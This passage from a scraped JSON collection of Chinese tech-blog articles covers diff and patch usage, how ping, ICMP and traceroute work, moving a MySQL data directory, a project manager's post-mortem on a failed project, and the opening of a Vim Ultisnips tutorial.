,.,.,/,myfixes,.,patch,patching ,file ,officespace,/,interest,.,go,Hunk, ,#1 succeeded at 26 (offset 15 lines).,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在这个例子中，补丁警告说代码改动并不在文件原来的地方而是偏移了 15 行。如果你文件改动的很厉害，补丁可能干脆说找不到要应用的地方，还好补丁程序提供了提供了打开“模糊”匹配的选项（这个选项在文档里有预置的警告信息，对其讲解已经超出了本文的范围）。,\n,如果你使用 Git 或者 GitHub 的话，你可能不会直接使用补丁或差异。Git 已经内置了这些功能，你能使用这些功能和共享一个源代码树的其他开发者交互，拉取或合并代码。Git 一个比较相近的功能是可以使用 ,git diff, 来对你的本地代码树生成全局差异，又或者对你的任意两次”引用“（可能是一个代表提交的数字，或一个标记或分支的名字，等等）做全局补丁。你甚至能简单的用管道将 ,git diff, 的输出到一个文件里（这个文件必须严格符合将要被使用它的程序的输入要求），然后将这个文件交给一个并不使用 Git 的开发者应用到他的代码上。当然，GitHub 把这些功能放到了 Web 上，你能直接在 Web 页面上查看一个拉取请求的文件变动。在 Web 上你能看到所展示的合并差异，GitHub 还允许你将这些代码改动下载为原始的补丁文件。,\n,总结,\n,好了，你已经学到了”差异“和”补丁“是什么，以及在 Unix/Linux 上怎么使用命令行工具和它们交互。除非你还在像 Linux 内核开发这样的项目中工作而使用完全基于补丁文件的开发方式，你应该会主要通过你的源代码控制系统（如 Git）来使用补丁。但熟悉像 GitHub 这样的高级别工具的技术背景和技术底层对你的工作也是大有裨益的。谁知道会不会有一天你需要和一个来自 Linux 世界邮件列表的补丁包打交道呢？,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114385/", "url_object_id": "adca6f2c20879c254551f23b464e5dfe", "front_image_path": "full/eb506ae0667dbbe488b212b50ee2a090282746df.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a1dc9868123d4debdf8ceb3c6bf4aae7.jpeg"], "title": "当你「ping 一下」的时候，你知道它背后的逻辑吗？", "create_time": "2018/09/16", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,奎哥（个人公号：不止思考）,   ,我们在遇到网络不通的情况，大家都知道去 ping 一下，看一下网络状况。,\n那你知道「ping」命令后背的逻辑是什么吗？知道它是如何实现的吗？\n,一、「ping」命令的作用和原理？,\n,简单来说，「ping」是用来探测本机与网络中另一主机之间是否可达的命令，如果两台主机之间ping不通，则表明这两台主机不能建立起连接。ping是定位网络通不通的一个重要手段。,\n,ping 命令是基于 ICMP 协议来工作的，「 ICMP 」全称为 Internet 控制报文协议（ Internet Control Message Protocol）。ping 命令会发送一份ICMP回显请求报文给目标主机，并等待目标主机返回ICMP回显应答。因为ICMP协议会要求目标主机在收到消息之后，必须返回ICMP应答消息给源主机，如果源主机在一定时间内收到了目标主机的应答，则表明两台主机之间网络是可达的。,\n,举一个例子来描述「ping」命令的工作过程：,\n,\n,假设有两个主机，主机A（192.168.0.1）和主机B（192.168.0.2），现在我们要监测主机A和主机B之间网络是否可达，那么我们在主机A上输入命令：ping 192.168.0.2,\n,此时，ping命令会在主机A上构建一个 ICMP的请求数据包（数据包里的内容后面再详述），然后 ICMP协议会将这个数据包以及目标IP（192.168.0.2）等信息一同交给IP层协议。,\n,IP层协议得到这些信息后，将源地址（即本机IP）、目标地址（即目标IP：192.168.0.2）、再加上一些其它的控制信息，构建成一个IP数据包。,\n,IP数据包构建完成后，还不够，还需要加上MAC地址，因此，还需要通过ARP映射表找出目标IP所对应的MAC地址。当拿到了目标主机的MAC地址和本机MAC后，一并交给数据链路层，组装成一个数据帧，依据以太网的介质访问规则，将它们传送出出去。,\n,当主机B收到这个数据帧之后，会首先检查它的目标MAC地址是不是本机，如果是就接收下来处理，接收之后会检查这个数据帧，将数据帧中的IP数据包取出来，交给本机的IP层协议，然后IP层协议检查完之后，再将ICMP数据包取出来交给ICMP协议处理，当这一步也处理完成之后，就会构建一个ICMP应答数据包，回发给主机A,\n,在一定的时间内，如果主机A收到了应答包，则说明它与主机B之间网络可达，如果没有收到，则说明网络不可达。除了监测是否可达以外，还可以利用应答时间和发起时间之间的差值，计算出数据包的延迟耗时。,\n,\n,通过ping的流程可以发现，ICMP协议是这个过程的基础，是非常重要的，因此下面就把ICMP协议再详细解释一下。,\n,二、什么是「 ICMP 」？,\n,我们知道，ping命令是基于ICMP协议来实现的。那么我们再来看下图，就明白了ICMP协议又是通过IP协议来发送的，即ICMP报文是封装在IP包中。,\n,\n,IP协议是一种无连接的，不可靠的数据包协议，它并不能保证数据一定被送达，那么我们要保证数据送到就需要通过其它模块来协助实现，这里就引入的是ICMP协议。,\n,当传送的IP数据包发送异常的时候，ICMP就会将异常信息封装在包内，然后回传给源主机。,\n,将上图再细拆一下可见：,\n,\n,继续将ICMP协议模块细拆:,\n,\n,由图可知，ICMP数据包由8bit的类型字段和8bit的代码字段以及16bit的校验字段再加上选项数据组成。,\n,ICMP协议大致可分为两类：,\n,\n,查询报文类型,\n,差错报文类型,\n,\n,\n,\n,查询报文类型,：,\n,\n,查询报文主要应用于：ping查询、子网掩码查询、时间戳查询等等。,\n,上面讲到的ping命令的流程其实就对应ICMP协议查询报文类型的一种使用。在主机A构建ICMP请求数据包的时候，其ICMP的类型字段中使用的是 8 （回送请求），当主机B构建ICMP应答包的时候，其ICMP类型字段就使用的是 0 （回送应答），更多类型值参考上表。,\n,对 查询报文类型 的理解可参考一下文章最开始讲的ping流程，这里就不做赘述。,\n,\n,差错报文类型,：,\n,\n,差错报文主要产生于当数据传送发送错误的时候。,\n它包括：目标不可达（网络不可达、主机不可达、协议不可达、端口不可达、禁止分片等）、超时、参数问题、重定向（网络重定向、主机重定向等）等等。,\n,差错报文通常包含了引起错误的IP数据包的第一个分片的IP首部，加上该分片数据部分的前8个字节。,\n当传送IP数据包发生错误的时候（例如 主机不可达），ICMP协议就会把错误信息封包，然后传送回源主机，那么源主机就知道该怎么处理了。,\n,那是不是只有遇到错误的时候才能使用 差错报文类型 呢？也不一定。,\n,Traceroute 就是一个例外，Traceroute是用来侦测源主机到目标主机之间所经过路由情况的常用工具。Traceroute 的原理就是利用ICMP的规则，制造一些错误的事件出来，然后根据错误的事件来评估网络路由情况。,\n,具体做法就是：,\n,Traceroute会设置特殊的TTL值，来追踪源主机和目标主机之间的路由数。首先它给目标主机发送一个 TTL=1 的UDP数据包，那么这个数据包一旦在路上遇到一个路由器，TTL就变成了0（TTL规则是每经过一个路由器都会减1），因为TTL=0了，所以路由器就会把这个数据包丢掉，然后产生一个错误类型（超时）的ICMP数据包回发给源主机，也就是差错包。这个时候源主机就拿到了第一个路由节点的IP和相关信息了。,\n,接着，源主机再给目标主机发一个 TTL=2 的UDP数据包，依旧上述流程走一遍，就知道第二个路由节点的IP和耗时情况等信息了。,\n,如此反复进行，Traceroute就可以拿到从主机A到主机B之间所有路由器的信息了。,\n,但是有个问题是，如果数据包到达了目标主机的话，即使目标主机接收到TTL值为1的IP数据包，它也是不会丢弃该数据包的，也不会产生一份超时的ICMP回发数据包的，因为数据包已经达到了目的地嘛。那我们应该怎么认定数据包是否达到了目标主机呢？,\n,Traceroute的方法是在源主机发送UDP数据包给目标主机的时候，会设置一个不可能达到的目标端口号（例如大于30000的端口号），那么当这个数据包真的到达目标主机的时候，目标主机发现没有对应的端口号，因此会产生一份“端口不可达”的错误ICMP报文返回给源主机。,\n,可见Traceroute的原理确实很取巧，很有趣。,\n,以上，就是对ping的基本原理以及ICMP协议的基本讲解了，欢迎大家一起交流。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114391/", "url_object_id": "fee3678ea1304e4cf45507e958bdfd90", "front_image_path": "full/e163dd0789f1114653a331123e2c76d7c34f8ebd.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "MySQL 更改数据库数据存储目录", "create_time": "2018/11/05", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,潇湘隐者,   ,MySQL数据库默认的数据库文件位于/var/lib/mysql下，有时候由于存储规划等原因，需要更改MySQL数据库的数据存储目录。下文总结整理了实践过程的操作步骤。,\n,1：确认MySQL数据库存储目录,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server tmp]# mysqladmin -u root -p variables | grep datadir\r\nEnter password: \r\n| datadir | /var/lib/mysql/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server ,tmp,],# mysqladmin -u root -p variables | grep datadir,Enter ,password,:, ,|, ,datadir, ,|, ,/,var,/,lib,/,mysql,/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,2：关闭MySQL服务,\n,在更改MySQL的数据目录前，必须关闭MySQL服务。,\n,方式,1,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server ~]# service mysql status\r\n \r\nMySQL running (9411)[ OK ]\r\n \r\n[root@DB-Server ~]# service mysql stop\r\n \r\nShutting down MySQL..[ OK ]\r\n \r\n[root@DB-Server ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server, ,~,],# service mysql status, ,MySQL ,running, ,(,9411,),[, ,OK, ,], ,[,root,@,DB,-,Server, ,~,],# service mysql stop, ,Shutting ,down ,MySQL,.,.,[, ,OK, ,], ,[,root,@,DB,-,Server, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,\n,\n,\n,\n,\n, ,\n,方式,2,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server ~]# /etc/rc.d/init.d/mysql status\r\n \r\nMySQL running (8900)[ OK ]\r\n \r\n[root@DB-Server ~]# /etc/rc.d/init.d/mysql stop\r\n \r\nShutting down MySQL..[ OK ]\r\n \r\n[root@DB-Server ~]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server, ,~,],# /etc/rc.d/init.d/mysql status, ,MySQL ,running, ,(,8900,),[, ,OK, ,], ,[,root,@,DB,-,Server, ,~,],# /etc/rc.d/init.d/mysql stop, ,Shutting ,down ,MySQL,.,.,[, ,OK, ,], ,[,root,@,DB,-,Server, ,~,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,3：创建新的数据库存储目录,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server ~]# cd /u01\r\n[root@DB-Server u01]# mkdir mysqldata,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server, ,~,],# cd /u01,[,root,@,DB,-,Server ,u01,],# mkdir mysqldata,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n, ,\n,4：移动MySQL数据目录到新位置,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server ~]# mv /var/lib/mysql /u01/mysqldata/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server, ,~,],# mv /var/lib/mysql /u01/mysqldata/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n, ,\n,5,：,修改配置文件,my.cnf,\n,并不是所有版本都包含有my.cnf这个配置文件，在MySQL 5.5版本，我就找不到my.cnf这个配置文件， 而有些MySQL版本该文件位于/usr/my.cnf，如果/etc/目录下没有my.cnf配置文件，请到/usr/share/mysql/下找到*.cnf文件，拷贝其中一个到/etc/并改名为my.cnf中。命令如下：,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server mysql]# cp /usr/share/mysql/my-medium.cnf /etc/my.cnf,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server ,mysql,],# cp /usr/share/mysql/my-medium.cnf /etc/my.cnf,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,编辑/etc/my.cnf文件，修改参数socket,\n,                         MySQL 5.5 版本,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# The following options will be passed to all MySQL clients\r\n[client]\r\n#password       = your_password\r\nport            = 3306\r\nsocket          = /u01/mysqldata/mysql/mysql.sock\r\n \r\n# Here follows entries for some specific programs\r\n \r\n# The MySQL server\r\n[mysqld]\r\nport            = 3306\r\nsocket          = /u01/mysqldata/mysql/mysql.sock\r\nskip-external-locking\r\nkey_buffer_size = 16M\r\nmax_allowed_packet = 1M\r\ntable_open_cache = 64\r\nsort_buffer_size = 512K\r\nnet_buffer_length = 8K\r\nread_buffer_size = 256K\r\nread_rnd_buffer_size = 512K\r\nmyisam_sort_buffer_size = 8M,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# The following options will be passed to all MySQL clients,[,client,],#password       = your_password,port,            ,=, ,3306,socket,          ,=, ,/,u01,/,mysqldata,/,mysql,/,mysql,.,sock, ,# Here follows entries for some specific programs, ,# The MySQL server,[,mysqld,],port,            ,=, ,3306,socket,          ,=, ,/,u01,/,mysqldata,/,mysql,/,mysql,.,sock,skip,-,external,-,locking,key_buffer_size, ,=, ,16M,max_allowed_packet, ,=, ,1M,table_open_cache, ,=, ,64,sort_buffer_size, ,=, ,512K,net_buffer_length, ,=, ,8K,read_buffer_size, ,=, ,256K,read_rnd_buffer_size, ,=, ,512K,myisam_sort_buffer_size, ,=, ,8M,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,\n,\n,\n,\n,\n, ,\n,6：修改启动脚本/etc/init.d/mysql,\n,将参数datadir修改为datadir=/u01/mysqldata/mysql/,\n,\n, ,\n,7：启动MySQL服务并验证MySQL数据库路径,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server ~]# service mysql start\r\nStarting MySQL..[  OK  ]\r\n[root@DB-Server ~]# mysqladmin -u root -p variables | grep datadir\r\nEnter password: \r\n| datadir        | /u01/mysqldata/mysql/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server, ,~,],# service mysql start,Starting ,MySQL,.,.,[,  ,OK,  ,],[,root,@,DB,-,Server, ,~,],# mysqladmin -u root -p variables | grep datadir,Enter ,password,:, ,|, ,datadir,        ,|, ,/,u01,/,mysqldata,/,mysql,/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,\n,\n,\n,\n,我的疑问：,\n,1： 在修改数据库的存储目录前，/var/lib/mysql/目录下根本没有mysql.sock文件，安装上面配置后，就会生成mysql.sock文件。,\n,关于mysql.sock文件，搜索了一下资料：mysql.sock是用于socket连接的文件。也就是只有你的守护进程启动起来这个文件才存在。但是你的mysql程序（这个程序是客户端，服务器端是mysqld）可以选择是否使用mysql.sock文件来连接（因为这个方法只适合在Unix主机上面连接本地的mysqld），对于非本地的任何类型的主机。那么这个文件是否一定需要的呢？ 这个需要进一步了解清楚。,\n,2：我在网上看有些网友总结的修改MySQL数据路径，有些需要给新建的目录的权限做一些处理，而有些有不用对目录权限进行授权，我没有处理，也没有什么问题。到底要不要对新的数据库目录授权呢？,\n,3：我在MySQL_5.6.20这个版本测试时，不修改my.cnf，只修改启动脚本/etc/init.d/mysql，也完全没有啥问题。也没有myssql.sock文件生成。,\n,4: 注意如果没有禁用selinux, 修改MySQL的数据路径后启动MySQL服务会遇到一些错误。关于这个的解释是后台服务都需要有对相应目录的对应权限，而 mysql 的默认路径/var/lib/mysql 已经添加了相应的策略，修改路径后由于没有相应的策略，导致后台进程读取文件被selinux阻止，从而出现权限错误。 所以要么关闭Selinux或修改文件安全上下文。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@DB-Server mysql]# /etc/init.d/mysql start\r\n \r\nStarting MySQL....The server quit without updating PID file (/u01/mysqldata/mysql//DB-Server.localdomain.pid).[FAILED]\r\n \r\n[root@DB-Server mysql]# \r\n \r\n[root@DB-Server mysql]# chcon -R -t mysqld_db_t /u01/mysqldata/mysql/\r\n \r\n[root@DB-Server mysql]# /etc/init.d/mysql start\r\n \r\nStarting MySQL.[ OK ]\r\n \r\n[root@DB-Server mysql]#,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,DB,-,Server ,mysql,],# /etc/init.d/mysql start, ,Starting ,MySQL,.,.,.,.,The ,server ,quit ,without ,updating ,PID ,file, ,(,/,u01,/,mysqldata,/,mysql,//DB-Server.localdomain.pid).[FAILED], ,[,root,@,DB,-,Server ,mysql,],# , ,[,root,@,DB,-,Server ,mysql,],# chcon -R -t mysqld_db_t /u01/mysqldata/mysql/, ,[,root,@,DB,-,Server ,mysql,],# /etc/init.d/mysql start, ,Starting ,MySQL,.,[, ,OK, ,], ,[,root,@,DB,-,Server ,mysql,],#,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,\n,\n,\n,\n,参考资料：,\n,http://database.ctocio.com.cn/tips/449/7566949.shtml,\n,www.linuxidc.com/Linux/2012-12/75647.htm,\n,http://blog.csdn.net/hellyhe/article/details/8309470,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114479/", "url_object_id": "b01599f760a20847250346416be84645", "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/862d3441fe78a8d48f7dc96d0acc95d2.jpg"], "title": "一名 IT 经理是怎么把一个项目带崩的", "create_time": "2018/09/04", "vote": "4", "bookmark": "7", "comments": "8", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,zer0Black, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,我是一名项目经理，在过去的四个月里，我把一个项目带崩了（上线后频出问题，用户无法使用）。在最近的几天，我每天都在反思自己，我都在问自己以下几个问题：,\n,1.我做错了什么？,\n2.我在其中占有多重的因素？,\n,以下内容，我将回答以上问题，并在最后说一下我的补救措施。,\n,项目和团队背景,\n,首先给大家说明一下项目背景，以便各位对此项目有更清晰的了解：,\n,1.该项目是一个二次开发项目，第一个基础版本（打印申报系统）也由我带领开发。,\n2.系统是需要和国家系统对接，有三条主流程。,\n3.需求频繁变化，由于系统需要对接国家系统，需求方对需求也不甚了解。曾在5月份一个月内需求变更超过8次，都是主流程变更。,\n4.项目大小按照最初需求估算，约在100人天左右。,\n5.项目两条主流程无法测试，依赖于外部U盾，但开发过程中并没有U盾。,\n6.客户现场使用U盾调试和开发时间约为20天左右。,\n7.我当时同时负责大大小小4个项目，没有进入开发，仅管控进度。,\n8.团队成员共3名，其中两名是当时开发基础版本的项目成员，他们对此项目较为熟悉。,\n9.项目推进过程中，需要多次去现场调试测试，由团队中的两名工程师共同前去。,\n,我做错了什么,\n,除了监控进度，还要管理质量,\n,在项目的开发初期，我制定了一份详细的开发计划，用于指导整个开发过程。开发计划交付与了客户，而答应了的事情就要做到，所以在整个项目过程中，我对进度管控很严。我定期检查功能是否完成，定期和客户汇报情况，保证了开发进度顺利推进。但也由此埋下了祸根，仅仅看需求是否完成，而未关注完成的质量如何。,\n,项目质量出现了许多细节性问题。比如：,\n,1.上线后，客户那边发现其中一条主流程都走不下去,\n2.其中申报功能，系统提示成功。但实际上并没有真的申报成功，申报后在国家系统无法查询到,\n3.打印功能小问题较多，打印获取的数据错误,\n4.同步数据的功能无法同步或者同步的数据错误,\n5.执行时间过长的功能，数据库会强制断开连接,\n,等等问题，就不一一列举,\n,反思：,\n,1.进度和开发速度固然重要，但以质量换速度不可取,\n2.如果开发时间和质量冲突，优先保质量，毕竟你埋下的坑，总是要坑你自己的,\n3.再困难的情况下，也要保证基本测试,\n4.时间极其不允许的情况下，也要保证主线功能顺利执行,\n,既要给予信任，也要保持警惕,\n,项目中的三名成员，都是合格的开发，对使用的框架非常熟悉。其中两名还是基础版本开发成员，对需求也很熟悉。所以项目中，我放心的把整个项目交给了他们。基于对他们的放心，加上其他项目事情繁杂，对此项目关注度，对他们的关注度就不够了。,\n,我在项目中给予了他们非常充分的信任，信任他们可以把一切事情都做好。但我没有在正确的时候给予他们正确的指引，项目中出现的困难点，我也没有帮助他们解决，甚至于没有给出思路。所有的一切，都靠他们自己完成。我在这个项目里做的，就是对接客户，催进度。再无第三件事。,\n,反思：,\n,1.不论什么原因，都要关注到项目成员的状态,\n2.给予信任没错，但也要适当保持警惕，他们多少会因为经验问题疏忽遗漏一些问题,\n3.给予信任，也要给予帮助，不以时间为理由推脱你应该对他们进行的指点和帮助。毕竟现在剩下来一分钟，以后要花一个小时去弥补,\n,若无法全局掌控，就指派专人负责,\n,这是我在项目中做的最错误的地方。,\n,由于种种原因，我无法掌握到项目的每个要点和细节。而项目中有三个开发。我并没指明其中某一个来负责整个项目，所有事情都让他们自己商量。从客户对接来的问题，我也是仅告知对应的开发。整个项目中，没有一个人对项目中的每个要点了如指掌。,\n,反思：,\n,1.手里捏着管理的权利，却没有做到管理的事情。是我在这个项目里最大的问题,\n2.授权！授权！授权！如果自己无法亲力亲为投入项目管理工作，就授权给团队某个成员管理权限，让他代替你去做管理工作,\n3.管理一人，总比管理多个人轻松，也更有效,\n,要控制需求，更要控制流程,\n,项目是二次开发、成员对项目很熟悉、项目工作量不大、时间紧。,\n,基于以上原因，我掉以轻心，没有在项目初期进行项目的设计和规划，未指定任何开发规范。仅仅告诉开发的同事要多复用，也未检查他们是否真的复用了。,\n,项目开发中的需求变更，客户反馈意见，我我都仅仅是告知他们一声，未做详细的修改规划，所有事情都靠嘴说，所有变动都放在了我和他们的脑子里。,\n,对项目上心程度不够，未对客户的需求变更做控制和管理。所有变更都压给了开发的同事。,\n,整个项目以及其不规范的方式在运行，我也未在其中起到控制作用，项目开发一团乱麻。,\n,反思：,\n,1.不做设计，不进开发,\n2.以管理工具指导开发进行，开发过程中所有变更、反馈做记录,\n3.控制需求变更，拒绝不合理的需求,\n4.需求变更规范化操作，统一变更，而不是直接压给开发,\n,无论什么情况下，都要进行code review,\n,整个项目过去了几乎四个月，我仅仅花了两个多小时简单看了下代码，未指出代码的任何问题。这也导致出问题后来我花了成倍的时间来处理code review的工作，并且项目成型后的代码修改困难。,\n,项目开发过程中，也未让开发间互相进行代码review，也没有进行代码评审会。,\n,其实代码中出现了很多问题，最后检查代码的时候，发现各种命名不规范、代码复用不到位、简单逻辑复杂写等等。而这些问题，很大一部分都是早期未做规定，未指定人负责项目、未进行早期code review造成的。开发各自为战，难免造成代码问题。,\n,代码质量的问题，淋漓尽致的体现的在项目中，项目中的诸多bug，都是因为代码不规范引起的。甚至于开发人员自己对自己写过的东西，都有些拎不清了。,\n,反思：,\n,1.代码质量非常重要，代码越规范bug越少,\n2.代码互评能让开发更注重自己代码的质量,\n3.code review非常有必要，越早期的code review越能有效的节省后期的时间,\n,我在其中占有多重的因素,\n,100%,\n,我怎么填坑的,\n,项目上线，问题频出，用户不满。花了8天时间来处理这个问题。幸亏项目不大，我一个人也能够挽回。,\n,目前暂时解决完毕，我简单说一下我是怎么填坑的：,\n,1.和开发主流程的同事详细熟悉了所有需求要点,\n2.基于我对项目需求的熟悉，我花了三天把所有主流程的所有代码分析完毕，做出了我认为应该的修改，并实施部署到生产环境测试（这是在给开着的飞机换引擎，但需要U盾才能测试，仅有生产环境的机器有U盾，别无他法）,\n3.每天花超过12个小时来进行code review 和修改，几乎每天code review + 修改到凌晨2点多（仅修改了问题较大且影响较小的地方。小问题未修改、牵涉面较广的地方未修改）,\n4.每次上班时间的修改让开发同事坐在旁边和我一起进行，我进行修改，开发同事在一旁监督。确保我不出错,\n5.优化功能点，把我发现的提示问题，和优化点都同步修改进代码中，确保用户体验不要太糟，以期能挽回一些用户心态,\n,我所吸取的教训总结,\n,1.先设计，后开发,\n2.管理权下放，项目中必须有人全身心负责,\n3.无论什么情况都要进行code review,\n4.压缩质量得到的进度保证不可取，开发周期不合理决不答应客户。否则坑了自己坑了同事，更坑了客户,\n\r\n        \r\n        \r\n        \n    ,\n        , ,4, 赞,\n        , 7 收藏,\n\n                    , 8 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,zer0Black,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            目前工作为移动开发，兴趣广泛，计算机各方面均有强烈兴趣。        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 26, · ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/107390/", "url_object_id": "a49e55ee9903149a00118337ee891fd3", "front_image_path": "full/158533223be951655a2f62a70168e5e8fc06b8cc.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/vim-logo.png"], "title": "Vim 代码片段插件 Ultisnips 使用教程", "create_time": "2018/09/03", "vote": "2", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,keelii, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,安装,\n,Ultisnips, 插件安装分两部分，一个是 ultisnips 插件本身，另外一个是代码片段仓库。一般来说把默认的代码片段仓库下载下来按需修改后上传到自己的 github 即可。如果你和我一样也使用 vim-plug 来管理插件的话，添加下面的代码到你的 vimrc 中保存刷新即可,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nPlug 'SirVer/ultisnips'\r\n# 你自己的代码仓库 git 地址\r\nPlug 'keelii/vim-snippets',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Plug, ,'SirVer/ultisnips',# 你自己的代码仓库 git 地址,Plug, ,'keelii/vim-snippets',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面的示例中所有的代码片段都存放在插件安装目录下面的 ,vim-snippets/UltiSnips, 中，文件命名格式为 ,ft,.snippets, ,ft, 就是 vim 中的 ,filetype,，其中有个 ,all.snippets, 